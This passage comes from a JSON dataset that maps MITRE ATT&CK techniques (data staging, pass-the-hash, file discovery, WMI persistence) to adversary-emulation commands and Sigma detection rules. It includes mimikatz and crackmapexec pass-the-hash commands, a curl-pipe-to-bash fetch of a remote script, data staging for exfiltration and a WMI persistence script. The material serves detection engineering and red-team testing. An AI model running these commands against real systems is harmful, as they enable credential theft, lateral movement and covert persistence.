"input_arguments": {"output_file": {"description": "Location to save downloaded discovery.bat file", "type": "Path", "default": "$env:TEMP\\discovery.bat"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.bat\" -OutFile #{output_file}\n", "cleanup_command": "Remove-Item -Force #{output_file} -ErrorAction Ignore\n"}}, {"name": "Stage data from Discovery.sh", "description": "Utilize curl to download discovery.sh and execute a basic information gathering shell script\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"output_file": {"description": "Location to save downloaded discovery.bat file", "type": "Path", "default": "/tmp/T1074_discovery.log"}}, "executor": {"name": "bash", "command": "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh | bash -s > #{output_file}\n"}}, {"name": "Zip a Folder with PowerShell for Staging in Temp", "description": "Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip\nwas placed in the temp directory.\n", "supported_platforms": ["windows"], "input_arguments": {"input_file": {"description": "Location of file or folder to zip", "type": "Path", "default": "PathToAtomicsFolder\\T1074\\bin\\Folder_to_zip"}, "output_file": {"description": "Location to save zipped file or folder", "type": "Path", "default": "$env:TEMP\\Folder_to_zip.zip"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "Compress-Archive -Path #{input_file} -DestinationPath #{output_file} -Force\n", "cleanup_command": "Remove-Item -Path #{output_file} -ErrorAction Ignore\n"}}]}}, {"Mitre Stockpile - copy files to staging directory": {"id": "4e97e699-93d7-4040-b5a3-2e906a58199e", "name": "Stage sensitive files", "description": "copy files to staging directory", "tactic": "collection", "technique": {"attack_id": "T1074", "name": "Data Staged"}, "platforms": {"darwin": {"sh": {"command": "cp \"#{host.file.path[filters(technique=T1005,max=3)]}\" #{host.dir.staged[filters(max=1)]}\n"}}, "linux": {"sh": {"command": "cp \"#{host.file.path[filters(technique=T1005,max=3)]}\" #{host.dir.staged[filters(max=1)]}\n"}}, "windows": {"psh": {"command": "Copy-Item #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}\n"}, "cmd": {"command": "copy #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.file.path"}]}, {"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.dir.staged"}]}]}}, {"Mitre Stockpile - create a directory for exfil staging": {"id": "6469befa-748a-4b9c-a96d-f191fde47d89", "name": "Create staging directory", "description": "create a directory for exfil staging", "tactic": "collection", "technique": {"attack_id": "T1074", "name": "Data Staged"}, "platforms": {"darwin": {"sh": {"command": "mkdir -p staged && echo $PWD/staged\n", "cleanup": "rm -rf staged\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}, "linux": {"sh": {"command": "mkdir -p staged && echo $PWD/staged\n", "cleanup": "rm -rf staged\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}, "windows": {"psh,pwsh": {"command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object\n", "cleanup": "Remove-Item -Path \"staged\" -recurse\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}}}}], "command_list": ["Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.bat\" -OutFile $env:TEMP\\discovery.bat\n", "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh | bash -s > /tmp/T1074_discovery.log\n", "Compress-Archive -Path PathToAtomicsFolder\\T1074\\bin\\Folder_to_zip -DestinationPath #{output_file} -Force\n", "Compress-Archive -Path #{input_file} -DestinationPath $env:TEMP\\Folder_to_zip.zip -Force\n", {"darwin": {"sh": {"command": "cp \"#{host.file.path[filters(technique=T1005,max=3)]}\" #{host.dir.staged[filters(max=1)]}\n"}}, "linux": {"sh": {"command": "cp \"#{host.file.path[filters(technique=T1005,max=3)]}\" #{host.dir.staged[filters(max=1)]}\n"}}, "windows": {"psh": {"command": "Copy-Item #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}\n"}, "cmd": {"command": "copy #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]\n"}}}, {"darwin": {"sh": {"command": "mkdir -p staged && echo $PWD/staged\n", "cleanup": "rm -rf staged\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}, "linux": {"sh": {"command": "mkdir -p staged && echo $PWD/staged\n", "cleanup": "rm -rf staged\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}, "windows": {"psh,pwsh": {"command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object\n", "cleanup": "Remove-Item -Path \"staged\" -recurse\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}}], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_command_line contains \"DownloadString\"and process_command_line contains \"Net.WebClient\")or (process_command_line contains \"New-Object\"and process_command_line contains \"IEX\")", "name": "Datal Staged Process"}], "possible_detections": []}, {"technique_id": "T1075", "commands": [{"source": "atomics/T1075/T1075.yaml", "command": "mimikatz # sekurlsa::pth /user:Administrator /domain:#{domain} /ntlm:#{ntlm}\n", "name": null}, {"source": "atomics/T1075/T1075.yaml", "command": "mimikatz # sekurlsa::pth /user:#{user_name} /domain:atomic.local /ntlm:#{ntlm}\n", "name": null}, {"source": "atomics/T1075/T1075.yaml", "command": "mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:cc36cf7a8514893efccd3324464tkg1a\n", "name": null}, {"source": "atomics/T1075/T1075.yaml", "command": "crackmapexec #{domain} -u Administrator -H #{ntlm} -x #{command} \n", "name": null}, {"source": "atomics/T1075/T1075.yaml", "command": "crackmapexec atomic.local -u #{user_name} -H #{ntlm} -x #{command} \n", "name": null}, {"source": "atomics/T1075/T1075.yaml", "command": "crackmapexec #{domain} -u #{user_name} -H cc36cf7a8514893efccd3324464tkg1a -x #{command} \n", "name": null}, {"source": "atomics/T1075/T1075.yaml", "command": "crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x whoami \n", "name": null}, {"source": "atomics/T1075/T1075.yaml", "command": "crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x #{command} \n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/pth", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/pth", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Pass the Hash": {"attack_technique": "T1075", "display_name": "Pass the Hash", "atomic_tests": [{"name": "Mimikatz Pass the Hash", "description": "Note: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)\n", "supported_platforms": ["windows"], "input_arguments": {"user_name": {"description": "username", "type": "string", "default": "Administrator"}, "domain": {"description": "domain", "type": "string", "default": "atomic.local"}, "ntlm": {"description": "ntlm hash", "type": "string", "default": "cc36cf7a8514893efccd3324464tkg1a"}}, "executor": {"name": "command_prompt", "command": "mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}\n"}}, {"name": "crackmapexec Pass the Hash", "description": "command execute with crackmapexec\n", "supported_platforms": ["windows"], "input_arguments": {"user_name": {"description": "username", "type": "string", "default": "Administrator"}, "domain": {"description": "domain", "type": "string", "default": "atomic.local"}, "ntlm": {"description": "command", "type": "string", "default": "cc36cf7a8514893efccd3324464tkg1a"}, "command": {"description": "command to execute", "type": "string", "default": "whoami"}, "crackmapexec_exe": {"description": "crackmapexec windows executable", "type": "Path", "default": "C:\\CrackMapExecWin\\crackmapexec.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})\n", "prereq_command": "if(Test-Path #{crackmapexec_exe}) { 0 } else { -1 }\n", "get_prereq_command": "Write-Host Automated installer not implemented yet, please install crackmapexec manually at this location: #{crackmapexec_exe}\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x #{command} \n"}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/credentials/mimikatz/pth", "ATT&CK Technique #1": "T1075", "ATT&CK Technique #2": "", "Technique": "Pass the Hash", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/pth\":  [\"T1075\"],"}}], "command_list": ["mimikatz # sekurlsa::pth /user:Administrator /domain:#{domain} /ntlm:#{ntlm}\n", "mimikatz # sekurlsa::pth /user:#{user_name} /domain:atomic.local /ntlm:#{ntlm}\n", "mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:cc36cf7a8514893efccd3324464tkg1a\n", "crackmapexec #{domain} -u Administrator -H #{ntlm} -x #{command} \n", "crackmapexec atomic.local -u #{user_name} -H #{ntlm} -x #{command} \n", "crackmapexec #{domain} -u #{user_name} -H cc36cf7a8514893efccd3324464tkg1a -x #{command} \n", "crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x whoami \n", "crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x #{command} \n", "powershell/credentials/mimikatz/pth", "powershell/credentials/mimikatz/pth"], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "Successful Overpass the Hash Attempt", "id": "192a0330-c20b-4356-90b6-7b7049ae0b87", "status": "experimental", "description": "Detects successful logon with logon type 9 (NewCredentials) which matches the Overpass the Hash behavior of e.g Mimikatz's sekurlsa::pth module.", "references": ["https://cyberwardog.blogspot.de/2017/04/chronicles-of-threat-hunter-hunting-for.html"], "author": "Roberto Rodriguez (source), Dominik Schaudel (rule)", "date": "2018/02/12", "tags": ["attack.lateral_movement", "attack.t1075", "attack.s0002"], "logsource": {"product": "windows", "service": "security"}, "detection": {"selection": {"EventID": 4624, "LogonType": 9, "LogonProcessName": "seclogo", "AuthenticationPackageName": "Negotiate"}, "condition": "selection"}, "falsepositives": ["Runas command-line tool using /netonly parameter"], "level": "high"}}, {"data_source": {"title": "Pass the Hash Activity", "id": "f8d98d6c-7a07-4d74-b064-dd4a3c244528", "status": "experimental", "description": "Detects the attack technique pass the hash which is used to move laterally inside the network", "references": ["https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Events"], "author": "Ilias el Matani (rule), The Information Assurance Directorate at the NSA (method)", "tags": ["attack.lateral_movement", "attack.t1075", "car.2016-04-004"], "logsource": {"product": "windows", "service": "security", "definition": "The successful use of PtH for lateral movement between workstations would trigger event ID 4624, a failed logon attempt would trigger an event ID 4625"}, "detection": {"selection": [{"EventID": 4624, "LogonType": "3", "LogonProcessName": "NtLmSsp", "WorkstationName": "%Workstations%", "ComputerName": "%Workstations%"}, {"EventID": 4625, "LogonType": "3", "LogonProcessName": "NtLmSsp", "WorkstationName": "%Workstations%", "ComputerName": "%Workstations%"}], "filter": {"AccountName": "ANONYMOUS LOGON"}, "condition": "selection and not filter"}, "falsepositives": ["Administrator activity", "Penetration tests"], "level": "medium"}}, {"data_source": {"title": "Pass the Hash Activity", "id": "8eef149c-bd26-49f2-9e5a-9b00e3af499b", "status": "production", "description": "Detects the attack technique pass the hash which is used to move laterally inside the network", "references": ["https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Events", "https://blog.binarydefense.com/reliably-detecting-pass-the-hash-through-event-log-analysis", "https://blog.stealthbits.com/how-to-detect-pass-the-hash-attacks/"], "author": "Dave Kennedy, Jeff Warren (method) / David Vassallo (rule)", "tags": ["attack.lateral_movement", "attack.t1075"], "logsource": {"product": "windows", "service": "security", "definition": "The successful use of PtH for lateral movement between workstations would trigger event ID 4624"}, "detection": {"selection": [{"EventID": 4624, "SubjectUserSid": "S-1-0-0", "LogonType": "3", "LogonProcessName": "NtLmSsp", "KeyLength": "0"}, {"EventID": 4624, "LogonType": "9", "LogonProcessName": "seclogo"}], "filter": {"AccountName": "ANONYMOUS LOGON"}, "condition": "selection and not filter"}, "falsepositives": ["Administrator activity", "Penetration tests"], "level": "medium"}}, {"data_source": {"title": "NTLM Logon", "id": "98c3bcf1-56f2-49dc-9d8d-c66cf190238b", "status": "experimental", "description": "Detects logons using NTLM, which could be caused by a legacy source or attackers", "references": ["https://twitter.com/JohnLaTwC/status/1004895028995477505", "https://goo.gl/PsqrhT"], "author": "Florian Roth", "date": "2018/06/08", "tags": ["attack.lateral_movement", "attack.t1075"], "logsource": {"product": "windows", "service": "ntlm", "definition": "Reqiures events from Microsoft-Windows-NTLM/Operational"}, "detection": {"selection": {"EventID": 8002, "CallingProcessName": "*"}, "condition": "selection"}, "falsepositives": ["Legacy hosts"], "level": "low"}}]}, {"technique_id": "T1083", "commands": [{"source": "atomics/T1083/T1083.yaml", "command": "dir /s c:\\ >> %temp%\\download\ndir /s \"c:\\Documents and Settings\" >> %temp%\\download\ndir /s \"c:\\Program Files\\\" >> %temp%\\download\ndir \"%systemdrive%\\Users\\*.*\" >> %temp%\\download\ndir \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\" >> %temp%\\download\ndir \"%userprofile%\\Desktop\\*.*\" >> %temp%\\download\ntree /F >> %temp%\\download\n", "name": null}, {"source": "atomics/T1083/T1083.yaml", "command": "ls -recurse\nget-childitem -recurse\ngci -recurse\n", "name": null}, {"source": "atomics/T1083/T1083.yaml", "command": "ls -a >> /tmp/T1083.txt\nif [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > /tmp/T1083.txt; fi;\nfile */* *>> /tmp/T1083.txt\ncat /tmp/T1083.txt 2>/dev/null\nfind . -type f\nls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'\nlocate *\nwhich sh\n", "name": null}, {"source": "atomics/T1083/T1083.yaml", "command": "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt\nif [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi;\nfind . -type f -iname *.pdf >> /tmp/T1083.txt\ncat /tmp/T1083.txt; fi;\nfind . -type f -name \".*\"\n", "name": null}, {"source": "data/abilities/discovery/1c353eb4-29ab-4dfe-88ed-f34f5a60848e.yml", "command": {"windows": {"psh": {"command": "Get-ChildItem -Path #{host.system.path}\n"}}}, "name": "Find or discover files on the file system"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/file_finder", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/file_finder", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/find_interesting_file", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/find_interesting_file", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/get_indexed_item", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/get_indexed_item", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_fileserver", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_fileserver", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - File and Directory Discovery": {"attack_technique": "T1083", "display_name": "File and Directory Discovery", "atomic_tests": [{"name": "File and Directory Discovery (cmd.exe)", "description": "Find or discover files on the file system.  Upon execution, the file \"download\" will be placed in the temporary folder and contain the output of\nall of the data discovery commands.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "dir /s c:\\ >> %temp%\\download\ndir /s \"c:\\Documents and Settings\" >> %temp%\\download\ndir /s \"c:\\Program Files\\\" >> %temp%\\download\ndir \"%systemdrive%\\Users\\*.*\" >> %temp%\\download\ndir \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\" >> %temp%\\download\ndir \"%userprofile%\\Desktop\\*.*\" >> %temp%\\download\ntree /F >> %temp%\\download\n"}}, {"name": "File and Directory Discovery (PowerShell)", "description": "Find or discover files on the file system. Upon execution, file and folder information will be displayed.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "ls -recurse\nget-childitem -recurse\ngci -recurse\n"}}, {"name": "Nix File and Diectory Discovery", "description": "Find or discover files on the file system\n\nReferences:\n\nhttp://osxdaily.com/2013/01/29/list-all-files-subdirectory-contents-recursively/\n\nhttps://perishablepress.com/list-files-folders-recursively-terminal/\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"output_file": {"description": "Output file used to store the results.", "type": "path", "default": "/tmp/T1083.txt"}}, "executor": {"name": "sh", "command": "ls -a >> #{output_file}\nif [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > #{output_file}; fi;\nfile */* *>> #{output_file}\ncat #{output_file} 2>/dev/null\nfind . -type f\nls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'\nlocate *\nwhich sh\n", "cleanup_command": "rm #{output_file}\n"}}, {"name": "Nix File and Directory Discovery 2", "description": "Find or discover files on the file system\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"output_file": {"description": "Output file used to store the results.", "type": "path", "default": "/tmp/T1083.txt"}}, "executor": {"name": "sh", "command": "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > #{output_file}\nif [ -f /etc/mtab ]; then cat /etc/mtab >> #{output_file}; fi;\nfind . -type f -iname *.pdf >> #{output_file}\ncat #{output_file}; fi;\nfind . -type f -name \".*\"\n", "cleanup_command": "rm #{output_file}"}}]}}, {"Mitre Stockpile - Find or discover files on the file system": {"id": "1c353eb4-29ab-4dfe-88ed-f34f5a60848e", "name": "File and Directory Discovery", "description": "Find or discover files on the file system", "tactic": "discovery", "technique": {"attack_id": "T1083", "name": "File and Directory Discovery"}, "platforms": {"windows": {"psh": {"command": "Get-ChildItem -Path #{host.system.path}\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.system.path"}]}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/file_finder", "ATT&CK Technique #1": "T1083", "ATT&CK Technique #2": "", "Technique": "File and Directory Discovery", "Concatenate for Python Dictionary": "\"powershell/collection/file_finder\":  [\"T1083\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/find_interesting_file", "ATT&CK Technique #1": "T1083", "ATT&CK Technique #2": "", "Technique": "File and Directory Discovery", "Concatenate for Python Dictionary": "\"powershell/collection/find_interesting_file\":  [\"T1083\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/get_indexed_item", "ATT&CK Technique #1": "T1083", "ATT&CK Technique #2": "", "Technique": "File and Directory Discovery", "Concatenate for Python Dictionary": "\"powershell/collection/get_indexed_item\":  [\"T1083\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/get_fileserver", "ATT&CK Technique #1": "T1083", "ATT&CK Technique #2": "T1135", "Technique": "File and Directory Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_fileserver\":  [\"T1083\",\"T1135\"],"}}], "command_list": ["dir /s c:\\ >> %temp%\\download\ndir /s \"c:\\Documents and Settings\" >> %temp%\\download\ndir /s \"c:\\Program Files\\\" >> %temp%\\download\ndir \"%systemdrive%\\Users\\*.*\" >> %temp%\\download\ndir \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\" >> %temp%\\download\ndir \"%userprofile%\\Desktop\\*.*\" >> %temp%\\download\ntree /F >> %temp%\\download\n", "ls -recurse\nget-childitem -recurse\ngci -recurse\n", "ls -a >> /tmp/T1083.txt\nif [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > /tmp/T1083.txt; fi;\nfile */* *>> /tmp/T1083.txt\ncat /tmp/T1083.txt 2>/dev/null\nfind . -type f\nls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'\nlocate *\nwhich sh\n", "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt\nif [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi;\nfind . -type f -iname *.pdf >> /tmp/T1083.txt\ncat /tmp/T1083.txt; fi;\nfind . -type f -name \".*\"\n", {"windows": {"psh": {"command": "Get-ChildItem -Path #{host.system.path}\n"}}}, "powershell/collection/file_finder", "powershell/collection/file_finder", "powershell/collection/find_interesting_file", "powershell/collection/find_interesting_file", "powershell/collection/get_indexed_item", "powershell/collection/get_indexed_item", "powershell/situational_awareness/network/powerview/get_fileserver", "powershell/situational_awareness/network/powerview/get_fileserver"], "attack_paths": [], "queries": [{"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: In the windows files and directories found\ndescription: windows server 2016\ntags: T1083\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ windows \\ system32 \\ tree.com' # process information> Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: tree # Process information> process command line\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "name": "Yml"}], "possible_detections": []}, {"technique_id": "T1084", "commands": [{"source": "atomics/T1084/T1084.yaml", "command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';\n                EventNameSpace='root\\CimV2';\n                QueryLanguage=\"WQL\";\n                Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs\n\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';\n                CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\notepad.exe\";}\n$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = [Ref] $Filter;\nConsumer = [Ref] $Consumer;\n}\n$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/elevated/wmi_updater", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/elevated/wmi_updater", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Windows Management Instrumentation Event Subscription": {"attack_technique": "T1084", "display_name": "Windows Management Instrumentation Event Subscription", "atomic_tests": [{"name": "Persistence via WMI Event Subscription", "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af\n\nhttps://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';\n                EventNameSpace='root\\CimV2';\n                QueryLanguage=\"WQL\";\n                Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs\n\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';\n                CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\notepad.exe\";}\n$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = [Ref] $Filter;\nConsumer = [Ref] $Consumer;\n}\n$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs\n", "cleanup_command": "$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = 'AtomicRedTeam-WMIPersistence-Example'\"\n$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'AtomicRedTeam-WMIPersistence-Example'\"\n$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" -ErrorAction SilentlyContinue\n$FilterConsumerBindingToCleanup | Remove-WmiObject\n$EventConsumerToCleanup | Remove-WmiObject\n$EventFilterToCleanup | Remove-WmiObject\n"}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/persistence/elevated/wmi_updater", "ATT&CK Technique #1": "T1084", "ATT&CK Technique #2": "", "Technique": "Windows Management Instrumentation Event Subscription", "Concatenate for Python Dictionary": "\"powershell/persistence/elevated/wmi_updater\":  [\"T1084\"],"}}], "command_list": ["$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';\n                EventNameSpace='root\\CimV2';\n                QueryLanguage=\"WQL\";\n                Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs\n\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';\n                CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\notepad.exe\";}\n$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = [Ref] $Filter;\nConsumer = [Ref] $Consumer;\n}\n$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs\n", "powershell/persistence/elevated/wmi_updater", "powershell/persistence/elevated/wmi_updater"], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "WMI Event Subscription", "id": "0f06a3a5-6a09-413f-8743-e6cf35561297", "status": "experimental", "description": "Detects creation of WMI event subscription persistence method", "references": ["https://attack.mitre.org/techniques/T1084/"], "tags": ["attack.t1084", "attack.persistence"], "author": "Tom Ueltschi (@c_APT_ure)", "date": "2019/01/12", "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selector": {"EventID": [19, 20, 21]}, "condition": "selector"}, "falsepositives": ["exclude legitimate (vetted) use of WMI event subscription in your network"], "level": "high"}}, {"data_source": {"title": "WMI Persistence - Command Line Event Consumer", "id": "05936ce2-ee05-4dae-9d03-9a391cf2d2c6", "status": "experimental", "description": "Detects WMI command line event consumers", "references": ["https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/"], "author": "Thomas Patzke", "date": "2018/03/07", "tags": ["attack.t1084", "attack.persistence"], "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 7, "Image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", "ImageLoaded": "wbemcons.dll"}, "condition": "selection"}, "falsepositives": ["Unknown (data set is too small; further testing needed)"], "level": "high"}}, {"data_source": {"title": "WMI Persistence - Script Event Consumer File Write", "id": "33f41cdd-35ac-4ba8-814b-c6a4244a1ad4", "status": "experimental", "description": "Detects file writes of WMI script event consumer", "references": ["https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/"], "author": "Thomas Patzke", "date": "2018/03/07", "tags": ["attack.t1084", "attack.persistence"], "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 11, "Image": "C:\\WINDOWS\\system32\\wbem\\scrcons.exe"}, "condition": "selection"}, 